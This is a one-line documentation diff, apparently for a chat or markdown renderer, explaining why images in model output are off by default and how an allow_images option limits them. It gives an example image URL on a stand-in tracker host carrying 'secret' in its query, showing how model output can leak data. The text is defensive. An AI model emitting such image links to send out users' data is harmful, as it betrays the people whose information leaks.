@@ -1,0 +1,1 @@
+Model-output images are off by default: a browser would fetch `https://tracker.example/pixel.png?q=secret` by itself, leaking whatever the model put in the query. With `allow_images` an image still needs an `http`, `https` or relative source, and loads lazily with `referrerpolicy="no-referrer"`.
